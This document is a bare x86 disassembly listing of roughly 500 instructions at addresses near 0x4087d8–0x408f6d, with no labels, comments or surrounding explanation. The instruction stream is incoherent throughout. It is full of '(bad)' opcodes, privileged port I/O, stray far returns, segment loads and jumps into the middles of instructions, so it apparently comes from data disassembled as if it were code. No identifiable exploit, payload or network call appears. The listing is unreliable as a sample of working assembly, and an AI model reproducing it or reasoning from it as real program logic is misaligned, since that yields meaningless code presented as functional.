  4087d8:	shl    BYTE PTR ds:0x9733a7eb,1
  4087de:	outs   dx,DWORD PTR ds:[esi]
  4087df:	adc    bh,BYTE PTR [ebx-0x31c51992]
  4087e5:	add    cl,bh
  4087e7:	or     al,0x8d
  4087e9:	xchg   edx,eax
  4087ea:	sub    ah,BYTE PTR [ebx-0x58]
  4087ed:	(bad)  [edx+0x1c]
  4087f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087f1:	loope  0x408868
  4087f3:	in     al,dx
  4087f4:	sub    BYTE PTR [ebp+0x133ee811],bl
  4087fa:	xor    DWORD PTR [esi],0xe62611a0
  408800:	push   0x4f
  408802:	js     0x408807
  408804:	or     eax,0xa56e6f52
  408809:	sbb    edi,DWORD PTR [esi+eax*8]
  40880c:	lods   eax,DWORD PTR ds:[esi]
  40880d:	cli    
  40880e:	fs clc 
  408810:	inc    esi
  408811:	cmp    eax,0xc4225b0e
  408816:	or     ebp,0x39
  408819:	dec    esp
  40881a:	retf   
  40881b:	sahf   
  40881c:	mov    fs,WORD PTR [esi-0x2df5268e]
  408822:	push   0x7d
  408824:	mov    ?,WORD PTR [edx+0x66da9528]
  40882a:	imul   ebx,DWORD PTR [eax-0x4e008929],0x4b
  408831:	pop    es
  408832:	xor    edi,DWORD PTR [edi-0x30]
  408835:	mov    edi,0x621b69ec
  40883a:	ret    0x1949
  40883d:	fs cld 
  40883f:	js     0x408801
  408841:	pop    ebx
  408842:	aam    0x98
  408844:	cli    
  408845:	popa   
  408846:	and    edx,DWORD PTR [edx-0x60]
  408849:	scas   eax,DWORD PTR es:[edi]
  40884a:	sti    
  40884b:	cmp    BYTE PTR ds:0xe3d04fd9,ah
  408851:	mov    dh,0xcf
  408853:	aam    0x3a
  408855:	fadd   DWORD PTR [ebx+0x6dbc0666]
  40885b:	adc    ah,BYTE PTR [ecx]
  40885d:	push   0x5
  40885f:	xor    edx,DWORD PTR [eax]
  408861:	jbe    0x408848
  408863:	popf   
  408864:	(bad)  
  408865:	rol    BYTE PTR [edi],cl
  408867:	jnp    0x408845
  408869:	sub    bh,BYTE PTR [ecx]
  40886b:	pop    esi
  40886c:	jns    0x408855
  40886e:	fucom  st(1)
  408870:	(bad)  [ebx]
  408872:	aam    0xe0
  408874:	mov    edx,0xf8309ed0
  408879:	or     esi,DWORD PTR [edi]
  40887b:	and    eax,0xca032660
  408880:	jb     0x4088c7
  408882:	pop    esi
  408883:	neg    WORD PTR [esi]
  408886:	rcr    eax,cl
  408888:	xor    al,BYTE PTR [ebp+0x31]
  40888b:	shl    BYTE PTR [edi-0x16b2ff7e],0xd
  408892:	lods   eax,DWORD PTR ds:[esi]
  408893:	lods   eax,DWORD PTR ds:[esi]
  408894:	neg    DWORD PTR [esi-0x30]
  408897:	imul   ecx,DWORD PTR gs:[ebp+0x79a1eeba],0x21
  40889f:	daa    
  4088a0:	or     edi,ebp
  4088a2:	ficomp WORD PTR ds:0x73668c77
  4088a8:	shl    BYTE PTR [edi+0x5d],0xf4
  4088ac:	mov    bl,0x4a
  4088af:	push   esp
  4088b0:	stos   BYTE PTR es:[edi],al
  4088b1:	add    DWORD PTR [ecx-0xf],ebp
  4088b4:	rcl    DWORD PTR [ecx+0x55],1
  4088b7:	ss (bad) 
  4088b9:	push   ds
  4088ba:	fldcw  WORD PTR [ebx]
  4088bc:	mov    cl,0x5a
  4088be:	mov    WORD PTR [ebx+eax*8-0x12b3b772],cs
  4088c5:	jb     0x40887f
  4088c7:	and    ebx,esp
  4088c9:	push   edi
  4088ca:	xchg   esp,eax
  4088cb:	sbb    al,0xa
  4088cd:	repz push eax
  4088cf:	sbb    eax,0x2d9f400e
  4088d4:	leave  
  4088d5:	das    
  4088d6:	add    al,0x9e
  4088d8:	add    al,0x5
  4088da:	cmp    edi,DWORD PTR [edi+0x55]
  4088dd:	mov    WORD PTR [eax-0x39ee7c4c],gs
  4088e3:	loop   0x4088b5
  4088e5:	sbb    ebp,ebp
  4088e7:	jl     0x408932
  4088e9:	xchg   esi,eax
  4088ea:	inc    ecx
  4088eb:	bound  esi,QWORD PTR [edi+0x45]
  4088ee:	add    eax,0xc5979ea4
  4088f3:	push   esi
  4088f4:	pop    ebx
  4088f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088f7:	ficom  DWORD PTR [ebx]
  4088f9:	dec    BYTE PTR [ebx]
  4088fb:	ds jl  0x4088bb
  4088fe:	pop    ebp
  4088ff:	lods   eax,DWORD PTR ds:[esi]
  408900:	pop    ebx
  408901:	adc    BYTE PTR [ebp+0x7c],dl
  408904:	push   edx
  408905:	sbb    BYTE PTR [ebp+0x75487c45],dh
  40890b:	mov    edx,0xd0f2a725
  408910:	xchg   esi,eax
  408911:	xchg   ecx,eax
  408912:	xor    eax,0xb5520ca9
  408917:	and    BYTE PTR [ebx+0x7af93f49],ch
  40891d:	loop   0x40897d
  40891f:	push   ss
  408920:	push   es
  408921:	dec    edx
  408922:	es dec ebp
  408924:	sub    DWORD PTR [edi+0x7],eax
  408927:	jp     0x4088e0
  408929:	sti    
  40892a:	inc    esp
  40892b:	mov    esp,0x2e5bb71a
  408930:	adc    al,0xa1
  408932:	mov    BYTE PTR [ebx],bh
  408934:	or     BYTE PTR [edi-0x711833ff],dl
  40893a:	popf   
  40893b:	pop    ax
  40893d:	cmp    DWORD PTR [eax+0x123e7cf],edi
  408943:	mov    ah,0x11
  408945:	dec    edx
  408946:	sbb    eax,0xcf8f6599
  40894b:	retf   
  40894c:	mov    DWORD PTR [ebx],esp
  40894e:	out    dx,eax
  40894f:	sub    al,0xbf
  408951:	pusha  
  408952:	mov    esp,0x16eb6d63
  408957:	ror    BYTE PTR [ecx+esi*8+0x12],cl
  40895b:	popf   
  40895c:	and    BYTE PTR [edi],dl
  40895e:	mov    esi,0xe1798117
  408963:	push   cs
  408964:	imul   esi,esi,0x5b4d4ebb
  40896a:	or     eax,0xf80aff7f
  40896f:	jl     0x40896b
  408971:	and    DWORD PTR [ebx],0x3a
  408974:	pop    ebx
  408975:	jle    0x4089ea
  408977:	mov    eax,ds:0x4147a15e
  40897c:	jns    0x4089a9
  40897e:	pop    eax
  40897f:	and    dl,0x6e
  408982:	repnz lock in al,dx
  408985:	xlat   BYTE PTR ds:[ebx]
  408986:	(bad)
  408989:	push   0x38
  40898b:	push   edi
  40898c:	sahf   
  40898d:	leave  
  40898e:	xchg   DWORD PTR [ebp+0x62],ebp
  408991:	adc    BYTE PTR [ebp-0x5b550047],ch
  408997:	mov    ds:0x8f4ec621,al
  40899c:	dec    ebp
  40899d:	pop    ebx
  40899e:	bound  esp,QWORD PTR [ecx-0x6f2086ad]
  4089a4:	inc    ecx
  4089a5:	clc    
  4089a6:	mov    al,fs:0xe152fade
  4089ac:	inc    edx
  4089ad:	dec    eax
  4089ae:	out    0x96,al
  4089b0:	push   ecx
  4089b1:	stc    
  4089b2:	ins    BYTE PTR es:[edi],dx
  4089b3:	sub    ah,dh
  4089b5:	push   ds
  4089b6:	sbb    BYTE PTR [esi-0x4b],bl
  4089b9:	das    
  4089ba:	imul   eax,DWORD PTR [edx+0x55],0xffffffb1
  4089be:	das    
  4089bf:	xchg   esp,eax
  4089c0:	add    eax,0x9a14215f
  4089c5:	shr    BYTE PTR [edi+0x69259a74],1
  4089cb:	jo     0x4089dd
  4089cd:	lahf   
  4089ce:	or     ebp,DWORD PTR [edx-0x14a649d1]
  4089d4:	push   ebp
  4089d5:	je     0x408a56
  4089d7:	lods   al,BYTE PTR ds:[esi]
  4089d8:	add    al,0xcf
  4089da:	xchg   esp,eax
  4089db:	sub    ah,cl
  4089dd:	xchg   esp,eax
  4089de:	push   esp
  4089df:	mov    ds:0x99fcc97c,al
  4089e4:	in     eax,0xcc
  4089e6:	sbb    DWORD PTR [ecx+0x7859d8a5],ebx
  4089ec:	gs dec ecx
  4089ee:	ins    DWORD PTR es:[edi],dx
  4089ef:	mov    bh,0x8b
  4089f1:	js     0x408a3d
  4089f3:	inc    esi
  4089f4:	ret    
  4089f5:	or     ah,BYTE PTR [ebp+0x758812a2]
  4089fb:	outs   dx,BYTE PTR ds:[esi]
  4089fc:	nop
  4089fd:	cmp    edx,DWORD PTR [eax-0xd]
  408a00:	aaa    
  408a01:	pop    eax
  408a02:	lods   eax,DWORD PTR ds:[esi]
  408a03:	cli    
  408a04:	mov    cl,0xe2
  408a06:	jb     0x4089be
  408a08:	or     DWORD PTR [esi-0x2ac54606],ecx
  408a0e:	cmp    al,0x1c
  408a10:	fwait
  408a11:	aaa    
  408a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a13:	bound  ebp,QWORD PTR [ebx+0x1cc6cdae]
  408a19:	mov    al,0x62
  408a1b:	or     al,0xc7
  408a1d:	or     eax,0xa947d029
  408a22:	xchg   edx,eax
  408a23:	add    eax,0x15443319
  408a28:	mov    al,0x5f
  408a2a:	cmp    eax,0xc774ea2e
  408a2f:	test   DWORD PTR [ecx],ecx
  408a31:	std    
  408a32:	jg     0x408a7e
  408a34:	lahf   
  408a35:	fwait
  408a36:	out    dx,eax
  408a37:	lods   eax,DWORD PTR ds:[esi]
  408a38:	in     al,dx
  408a39:	adc    DWORD PTR [ebp+ebp*4-0x6f],edx
  408a3d:	or     BYTE PTR [esi+0x492fb690],ah
  408a43:	pop    ds
  408a44:	xlat   BYTE PTR ds:[ebx]
  408a45:	pusha  
  408a46:	outs   dx,DWORD PTR ds:[esi]
  408a47:	and    dl,BYTE PTR [edi-0x7b]
  408a4a:	jmp    0x408a64
  408a4c:	push   es
  408a4d:	rol    DWORD PTR [ebx+esi*2-0x1c29597],cl
  408a54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a55:	jmp    0x408a78
  408a57:	add    ah,BYTE PTR [ebp+0x4ebe78dc]
  408a5d:	pop    esp
  408a5e:	dec    esp
  408a5f:	adc    eax,0x312ff069
  408a64:	mov    BYTE PTR [ecx+eax*2],dh
  408a67:	ins    BYTE PTR es:[edi],dx
  408a68:	or     eax,DWORD PTR [eax]
  408a6a:	fs adc ch,bl
  408a6d:	or     al,0x42
  408a6f:	(bad)  
  408a70:	arpl   sp,cx
  408a72:	aas    
  408a73:	pop    ds
  408a74:	cdq    
  408a75:	mov    edx,0xd2003ce6
  408a7a:	loope  0x408a5f
  408a7c:	sub    ebp,esi
  408a7e:	or     ecx,DWORD PTR [edi-0x65]
  408a81:	xor    al,0x27
  408a83:	pop    esi
  408a84:	inc    edi
  408a86:	sub    eax,0x4fefac60
  408a8b:	cmp    al,0x57
  408a8d:	hlt    
  408a8e:	dec    ebp
  408a8f:	and    BYTE PTR [ebp+0x67],bl
  408a92:	fcmove st,st(4)
  408a94:	ret    
  408a95:	and    al,0xc6
  408a97:	test   DWORD PTR [ecx+0x0],eax
  408a9a:	push   ebp
  408a9b:	inc    edx
  408a9c:	dec    edx
  408a9d:	and    BYTE PTR [ecx],dl
  408a9f:	lock dec ecx
  408aa1:	cwde   
  408aa2:	mul    DWORD PTR [ecx-0x52]
  408aa5:	add    al,0x7c
  408aa7:	loopne 0x408ae2
  408aa9:	cld    
  408aaa:	push   cs
  408aab:	movzx  edi,BYTE PTR [ebx+0x3a]
  408aaf:	retf   
  408ab0:	push   eax
  408ab1:	xor    al,0x2b
  408ab3:	shl    bl,1
  408ab5:	xor    cl,al
  408ab7:	xchg   esi,eax
  408ab8:	retf   
  408ab9:	js     0x408ab8
  408abb:	pop    esp
  408abc:	xor    eax,0xdf372649
  408ac1:	mov    al,0x19
  408ac3:	(bad)  
  408ac4:	jp     0x408aed
  408ac6:	pop    edx
  408ac7:	pop    esp
  408ac8:	aad    0x8
  408aca:	cli    
  408acb:	sub    edx,ecx
  408acd:	rcr    BYTE PTR [ecx+0x6b8a39e5],0x18
  408ad4:	in     eax,dx
  408ad5:	or     al,0x7f
  408ad7:	mov    ds:0x7a0e4ba8,eax
  408adc:	push   eax
  408add:	lahf   
  408ade:	call   0xc7d890e3
  408ae3:	(bad)  
  408ae4:	imul   esp,edi,0x481ff8b8
  408aea:	dec    ebx
  408aeb:	retf   0x74a9
  408aee:	or     BYTE PTR [eax+0x31],ch
  408af1:	add    al,dh
  408af3:	lock jbe 0x408b3e
  408af6:	jnp    0x408b70
  408af8:	int    0xe
  408afa:	xor    eax,0xc1bfe388
  408aff:	mov    DWORD PTR [edi],ebp
  408b01:	xchg   edx,eax
  408b02:	dec    ecx
  408b03:	ret    0x739b
  408b06:	outs   dx,BYTE PTR ds:[esi]
  408b07:	fcomp  DWORD PTR [ebp+0x3d]
  408b0a:	es sub al,0xc3
  408b0d:	jno    0x408b05
  408b0f:	outs   dx,DWORD PTR ds:[esi]
  408b10:	pop    DWORD PTR [ecx+0x110be016]
  408b16:	push   es
  408b17:	popf   
  408b18:	cld    
  408b19:	sbb    eax,0x95ed05ea
  408b1e:	push   cs
  408b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b20:	fwait
  408b21:	addr16 in al,dx
  408b23:	pop    esp
  408b24:	or     BYTE PTR [esi+eax*8+0x1b99326b],ah
  408b2b:	data16 sub al,0xdb
  408b2e:	xor    BYTE PTR [ecx],bh
  408b30:	idiv   BYTE PTR [ecx+0x601a632f]
  408b36:	dec    esp
  408b37:	mov    ebx,0x5ba4789e
  408b3c:	dec    eax
  408b3d:	mov    al,ds:0x5b4c984f
  408b42:	and    eax,0x7c54f7e4
  408b47:	daa    
  408b48:	imul   ebp,DWORD PTR [esi-0x58a74cbb],0x3f213d35
  408b52:	mov    esp,0x26e1d8ed
  408b57:	xchg   ebx,eax
  408b58:	sub    DWORD PTR [esp+edi*4+0x247cd200],esp
  408b5f:	(bad)  [edx+0x1c2d1762]
  408b65:	lahf   
  408b66:	ret    
  408b67:	xchg   esp,eax
  408b68:	jno    0x408b73
  408b6a:	pop    ecx
  408b6b:	mov    esp,0x25fa2725
  408b70:	lahf   
  408b71:	ds pushw ss
  408b74:	pop    esi
  408b75:	dec    esp
  408b76:	mov    al,0x85
  408b78:	sti    
  408b79:	dec    ebx
  408b7a:	xchg   DWORD PTR [esi],esp
  408b7c:	(bad)  
  408b7d:	retf   0x9317
  408b80:	aad    0x1d
  408b82:	push   esp
  408b83:	sub    al,0x16
  408b85:	sbb    bl,cl
  408b87:	pop    es
  408b88:	xchg   edi,eax
  408b89:	mov    ch,0x64
  408b8b:	mov    esi,0xf8925fa6
  408b90:	arpl   WORD PTR ds:0x8519656,cx
  408b96:	ret    0x1943
  408b99:	inc    edx
  408b9a:	xlat   BYTE PTR ds:[ebx]
  408b9b:	xchg   esp,eax
  408b9c:	call   0x660d9b7e
  408ba1:	mov    ds:0x46e4671a,eax
  408ba6:	retf   
  408ba7:	clc    
  408ba8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ba9:	iret   
  408baa:	imul   ebp,DWORD PTR [esi],0x72d19bf8
  408bb0:	js     0x408c0f
  408bb2:	dec    esp
  408bb3:	jmp    0x408b56
  408bb5:	mov    cl,0x5d
  408bb7:	pop    esp
  408bb8:	loope  0x408bf9
  408bba:	ins    BYTE PTR es:[edi],dx
  408bbb:	pop    edx
  408bbc:	clc    
  408bbd:	sahf   
  408bbe:	idiv   BYTE PTR [ebx-0x7a5b2f54]
  408bc4:	aaa    
  408bc5:	test   al,0x5f
  408bc7:	in     eax,dx
  408bc8:	sbb    al,0x9b
  408bca:	add    edi,ebx
  408bcc:	clc    
  408bcd:	std    
  408bce:	and    DWORD PTR [eax+0x41aafc66],ecx
  408bd4:	popf   
  408bd5:	lock mov al,BYTE PTR [eax-0xe]
  408bd9:	sbb    BYTE PTR [ebx+0x7f165eca],0x4c
  408be0:	(bad)  
  408be1:	fdivr  DWORD PTR [edi+0x77bf2af7]
  408be7:	ja     0x408bed
  408be9:	xor    al,0x54
  408beb:	in     eax,dx
  408bec:	loope  0x408c0d
  408bee:	dec    ebp
  408bef:	dec    esi
  408bf0:	fwait
  408bf1:	ins    DWORD PTR es:[edi],dx
  408bf2:	pop    edx
  408bf3:	push   ebp
  408bf4:	les    edi,FWORD PTR [ecx]
  408bf6:	stos   BYTE PTR es:[edi],al
  408bf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bf8:	fimul  WORD PTR [ecx-0x80c0583]
  408bfe:	jmp    0xa5454f42
  408c03:	or     bh,BYTE PTR [ebx+0x4d]
  408c06:	dec    edx
  408c07:	or     ah,BYTE PTR [edx+0x25]
  408c0a:	push   0x35948eb
  408c0f:	stos   BYTE PTR es:[edi],al
  408c10:	inc    esp
  408c11:	cmc    
  408c12:	shl    al,1
  408c14:	loope  0x408bdc
  408c16:	outs   dx,DWORD PTR gs:[esi]
  408c18:	xchg   edi,eax
  408c19:	mulps  xmm0,xmm1
  408c1c:	xchg   ecx,eax
  408c1d:	mov    al,ds:0xf3068dad
  408c22:	cmp    ebp,ecx
  408c24:	and    ch,bh
  408c26:	and    esp,ecx
  408c28:	fwait
  408c29:	popf   
  408c2a:	clc    
  408c2b:	in     al,dx
  408c2c:	and    eax,0xf834f693
  408c31:	xor    BYTE PTR ds:0x138e97f8,bl
  408c37:	ins    DWORD PTR es:[edi],dx
  408c38:	or     al,0xf9
  408c3a:	jle    0x408ca2
  408c3c:	and    BYTE PTR [ebx+0x3df4c925],cl
  408c42:	dec    edi
  408c43:	mov    dl,0x98
  408c45:	push   es
  408c46:	test   BYTE PTR [ebx],bl
  408c48:	dec    eax
  408c49:	test   al,0x2a
  408c4b:	inc    ecx
  408c4c:	xchg   ecx,eax
  408c4d:	out    dx,eax
  408c4e:	jo     0x408bd5
  408c50:	inc    edi
  408c51:	cld    
  408c52:	fisubr WORD PTR [ebp+0x4d84141c]
  408c58:	jno    0x408c8e
  408c5a:	xor    esp,0x63
  408c5d:	mov    esp,0xcc7d1b1f
  408c62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c64:	or     BYTE PTR [ecx-0x231314d7],al
  408c6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c6b:	cmc    
  408c6c:	mov    ebx,0x2e30499a
  408c71:	xor    DWORD PTR [edi+0x43],edx
  408c74:	fsubr  QWORD PTR [ebp-0x6839365d]
  408c7a:	xor    BYTE PTR [esi-0x3aaf933d],0x9
  408c81:	fwait
  408c82:	repz dec edx
  408c84:	mov    esi,0xf6ebcc28
  408c89:	mov    dh,BYTE PTR [esi-0x64]
  408c8c:	(bad)  
  408c8d:	hlt    
  408c8e:	push   eax
  408c8f:	cmp    al,0xce
  408c91:	sar    BYTE PTR [eax],0x83
  408c94:	test   al,0x37
  408c96:	cmp    al,0x99
  408c98:	jbe    0x408c58
  408c9a:	in     eax,0x4
  408c9c:	imul   ebx,ebx,0x251e8586
  408ca2:	xor    edi,DWORD PTR [edi]
  408ca4:	mov    dl,al
  408ca6:	je     0x408d05
  408ca8:	out    dx,eax
  408ca9:	ins    BYTE PTR es:[edi],dx
  408caa:	imul   ecx,edi,0x92a4af45
  408cb0:	mov    edi,0x4d913bc3
  408cb6:	retf   0xc1f3
  408cb9:	inc    ebp
  408cba:	and    ah,bh
  408cbc:	cs xchg ebx,eax
  408cbe:	inc    edi
  408cbf:	rol    BYTE PTR [edx-0x4bd2f712],0x49
  408cc6:	fld    QWORD PTR [edx+ebx*4-0x7b]
  408cca:	mov    ch,0x2f
  408ccc:	jg     0x408d37
  408cce:	or     BYTE PTR [edx-0x1a],dl
  408cd1:	cs mov bh,0xad
  408cd4:	mov    esi,DWORD PTR ds:0x6024010d
  408cda:	ss cmc 
  408cdc:	jb     0x408d4a
  408cde:	mov    ch,0x19
  408ce0:	adc    edi,DWORD PTR ds:0x94e7e0dc
  408ce6:	nop
  408ce7:	sub    ebp,DWORD PTR [eax+0x54]
  408cea:	dec    ebx
  408ceb:	test   BYTE PTR [eax+0x6c],ah
  408cee:	xor    al,0xe4
  408cf0:	push   0x207ddde9
  408cf5:	xchg   DWORD PTR [esi+0x55ab537b],edx
  408cfb:	push   0xcfc1aeb3
  408d00:	dec    eax
  408d01:	cli    
  408d02:	mov    eax,0xde04cb2b
  408d07:	(bad)  
  408d08:	fsubr  DWORD PTR [esi-0x69b5f9e2]
  408d0e:	and    BYTE PTR [ecx-0x28b0593],ch
  408d14:	test   eax,0x680b055c
  408d19:	pop    es
  408d1a:	inc    edx
  408d1b:	pusha  
  408d1c:	and    ecx,0x213022bb
  408d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d23:	aas    
  408d24:	jecxz  0x408da4
  408d26:	dec    edx
  408d27:	and    BYTE PTR [ecx+edi*1],dh
  408d2a:	jno    0x408d2a
  408d2c:	rcl    BYTE PTR [ebp+0x7840a3a9],0x6d
  408d33:	add    BYTE PTR [esp+eax*2+0x5d8fe849],bh
  408d3a:	dec    edi
  408d3b:	aas    
  408d3c:	stos   DWORD PTR es:[edi],eax
  408d3d:	push   ebx
  408d3e:	dec    bl
  408d40:	inc    eax
  408d41:	or     dl,BYTE PTR [edi-0x4a]
  408d44:	std    
  408d45:	test   BYTE PTR ds:0x7e70dc66,0x10
  408d4c:	sub    DWORD PTR [esi],ecx
  408d4e:	jmp    0x408db9
  408d50:	fimul  DWORD PTR [esi+0xf]
  408d53:	fld    st(5)
  408d55:	jge    0x408cf5
  408d57:	adc    BYTE PTR [esi+0x7390e71d],ch
  408d5d:	retf   0xf9f3
  408d60:	cli    
  408d61:	rol    bl,0x70
  408d64:	out    dx,eax
  408d65:	out    dx,eax
  408d66:	jno    0x408da2
  408d68:	xchg   ebx,eax
  408d69:	jmp    0x3c85:0x9c0aa2bf
  408d70:	fcomip st,st(6)
  408d72:	jo     0x408d9a
  408d74:	fild   QWORD PTR [eax-0x5b3ad6e6]
  408d7a:	leave  
  408d7b:	test   al,0x9b
  408d7d:	repnz and ch,BYTE PTR [edx+0x4]
  408d81:	ror    BYTE PTR [ebx],0x8b
  408d84:	clc    
  408d85:	sbb    eax,0xb6809720
  408d8a:	push   DWORD PTR [eax+edx*1+0x3418030e]
  408d91:	jmp    0xfa91a43c
  408d96:	or     eax,0x90b3f07
  408d9b:	int    0x3a
  408d9d:	ja     0x408d8d
  408d9f:	push   edi
  408da0:	pop    eax
  408da1:	inc    ebp
  408da2:	xor    DWORD PTR [ebx+0x50dd6890],esp
  408da8:	pop    esi
  408da9:	adc    dh,ah
  408dab:	lds    eax,FWORD PTR [ebx+0x19]
  408dae:	push   esi
  408daf:	in     eax,0x1b
  408db1:	cmp    al,0x8d
  408db3:	pop    es
  408db4:	mov    DWORD PTR [eax+0x5],edi
  408db7:	adc    eax,ebp
  408db9:	mov    cl,0x7e
  408dbb:	jae    0x408dd3
  408dbd:	mul    DWORD PTR [ecx+0x3a]
  408dc0:	sub    BYTE PTR [esi-0x43],ch
  408dc3:	(bad)  
  408dc4:	inc    ebx
  408dc5:	in     eax,dx
  408dc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408dc7:	ficom  DWORD PTR [ebx+0x22137547]
  408dcd:	adc    ecx,esp
  408dcf:	cdq    
  408dd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408dd1:	xchg   esp,eax
  408dd2:	push   cs
  408dd3:	cld    
  408dd4:	enter  0xabc4,0x9d
  408dd8:	ins    DWORD PTR es:[edi],dx
  408dd9:	lds    edi,FWORD PTR [edx]
  408ddb:	and    BYTE PTR [edi+ecx*2],cl
  408dde:	adc    DWORD PTR [ebp-0x6008c074],esi
  408de4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408de5:	push   0x28
  408de7:	ffreep st(2)
  408de9:	add    ah,BYTE PTR [edx]
  408deb:	data16 ds cld 
  408dee:	aad    0xad
  408df0:	out    0x9b,eax
  408df2:	inc    edi
  408df3:	xlat   BYTE PTR ds:[ebx]
  408df4:	or     bh,BYTE PTR [ebp-0x6b]
  408df7:	loopne 0x408e74
  408df9:	dec    ecx
  408dfa:	xchg   esi,eax
  408dfb:	out    dx,eax
  408dfc:	sub    BYTE PTR [ebx-0x4c0e9d0d],bh
  408e02:	xchg   esp,eax
  408e03:	cmp    BYTE PTR [eax+0x549d8722],dl
  408e09:	arpl   ax,bp
  408e0b:	mov    ds:0x405a57c6,al
  408e10:	mov    ds:0x645a9d23,eax
  408e15:	repz add ebx,DWORD PTR [ebp-0x1a615889]
  408e1c:	sub    al,0xc7
  408e1e:	shl    DWORD PTR [ebx+0x6de0fe39],1
  408e24:	pushf  
  408e25:	cld    
  408e26:	sbb    eax,0x8d544a3a
  408e2b:	loopne 0x408db9
  408e2d:	fcomp  DWORD PTR [edx+edx*8+0x30a5f603]
  408e34:	nop
  408e35:	jne    0x408e9f
  408e37:	push   ebp
  408e38:	stos   BYTE PTR es:[edi],al
  408e39:	inc    esp
  408e3a:	mov    esp,0xb7e79ad1
  408e3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e40:	adc    al,BYTE PTR ds:0x1c80ccc6
  408e46:	mov    dh,0x44
  408e48:	in     al,0x19
  408e4a:	imul   esi,DWORD PTR [edx],0xffffffda
  408e4d:	sub    dl,BYTE PTR [ecx]
  408e4f:	aam    0xda
  408e51:	fstp   DWORD PTR [eax+esi*1]
  408e54:	xchg   ebx,eax
  408e55:	retf   0x2db1
  408e58:	(bad)  
  408e59:	mov    ecx,0xc849ae16
  408e5e:	cdq    
  408e5f:	in     al,0x9f
  408e61:	rcl    DWORD PTR [ebx-0xa534ec8],1
  408e67:	mov    esp,0x83cbd00d
  408e6c:	xchg   esp,eax
  408e6d:	mov    ch,0x99
  408e6f:	iret   
  408e70:	cmp    DWORD PTR ds:0x4091fa0c,0xffffff88
  408e77:	ret    0x98a9
  408e7a:	ror    BYTE PTR [esi+0x78],cl
  408e7d:	outs   dx,BYTE PTR ds:[esi]
  408e7e:	lock sub eax,DWORD PTR [edi-0x60084479]
  408e85:	dec    ebx
  408e86:	ss adc dh,bl
  408e89:	xor    eax,0x959fe1f2
  408e8e:	and    BYTE PTR [esi+eiz*1-0x7963a6b6],dh
  408e95:	mov    ecx,esp
  408e97:	ins    BYTE PTR es:[edi],dx
  408e98:	test   al,0x8f
  408e9a:	shr    DWORD PTR [ebx-0x6a],1
  408e9d:	es dec esi
  408e9f:	sub    cl,BYTE PTR [eax+0x7c]
  408ea2:	test   al,0x70
  408ea4:	and    al,0x63
  408ea6:	add    DWORD PTR [ebp+0x17],ecx
  408ea9:	xor    BYTE PTR [eax-0x75f1411f],0x80
  408eb0:	xchg   esi,eax
  408eb1:	xor    ecx,edx
  408eb3:	je     0x408e98
  408eb5:	add    bh,BYTE PTR ds:0xbfd5efff
  408ebb:	jp     0x408ee0
  408ebd:	cmp    BYTE PTR [edx],bh
  408ebf:	and    bh,BYTE PTR [ecx-0x4b]
  408ec2:	sbb    eax,0x84ea8725
  408ec7:	xchg   edi,eax
  408ec8:	ficom  WORD PTR [eax+ebp*4-0x3201d4b7]
  408ecf:	in     eax,0xdb
  408ed1:	jnp    0x408f0a
  408ed3:	cmp    BYTE PTR [edi],bh
  408ed5:	mov    esi,DWORD PTR [ecx+0x6]
  408ed8:	mov    dl,0xa2
  408eda:	es ja  0x408f4a
  408edd:	in     al,dx
  408ede:	dec    ecx
  408edf:	sub    BYTE PTR [edi-0x16],bh
  408ee2:	dec    eax
  408ee3:	pop    ss
  408ee4:	xor    ch,BYTE PTR [eax-0x65]
  408ee7:	call   0x2df4d8f1
  408eec:	inc    ecx
  408eed:	sub    al,0x52
  408eef:	mov    esp,0x102ac46c
  408ef4:	or     DWORD PTR [edx-0x61],ecx
  408ef7:	or     eax,0xf6b7fb2a
  408efc:	adc    al,BYTE PTR [ebp-0xbbd8c22]
  408f02:	and    al,0x43
  408f04:	fisttp WORD PTR [ecx]
  408f06:	or     bh,BYTE PTR [edx+ecx*4+0x36]
  408f0a:	dec    edi
  408f0b:	or     al,0xd4
  408f0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f0e:	sbb    eax,0xebc9e32d
  408f13:	stos   DWORD PTR es:[edi],eax
  408f14:	ins    BYTE PTR es:[edi],dx
  408f15:	clc    
  408f16:	test   eax,0xf68bdb06
  408f1b:	pop    edx
  408f1c:	clc    
  408f1d:	xchg   ebp,eax
  408f1e:	push   ds
  408f1f:	test   esp,ebp
  408f21:	int3   
  408f22:	cmp    al,BYTE PTR [ebx-0x21fdaae3]
  408f28:	or     esp,esi
  408f2a:	int    0xb7
  408f2c:	inc    ebx
  408f2d:	loopne 0x408faa
  408f2f:	popf   
  408f30:	out    dx,eax
  408f31:	xor    DWORD PTR [esp+ebx*8],eax
  408f34:	je     0x408ecf
  408f36:	fwait
  408f37:	or     al,0xe7
  408f39:	inc    ebp
  408f3a:	jae    0x408f39
  408f3c:	ror    BYTE PTR [ebx+eiz*1-0x77dff3d9],1
  408f43:	jmp    0x408f1e
  408f45:	fwait
  408f46:	loope  0x408f30
  408f48:	jne    0x408f87
  408f4a:	adc    DWORD PTR [eax-0x74],ecx
  408f4d:	push   es
  408f4e:	dec    edx
  408f4f:	inc    ebp
  408f50:	jecxz  0x408f4d
  408f52:	mov    ecx,eax
  408f54:	scas   eax,DWORD PTR es:[edi]
  408f55:	fadd   st(7),st
  408f57:	sti    
  408f58:	sbb    edx,edi
  408f5a:	rcl    BYTE PTR [ebx],0x58
  408f5d:	sar    BYTE PTR [edi-0x4],cl
  408f60:	pop    ebp
  408f61:	mov    BYTE PTR [esi+0x77],ah
  408f64:	cmp    eax,0x5eb7afd1
  408f69:	and    bh,bl
  408f6b:	(bad)  
  408f6c:	into   
  408f6d:	je     0x408f33
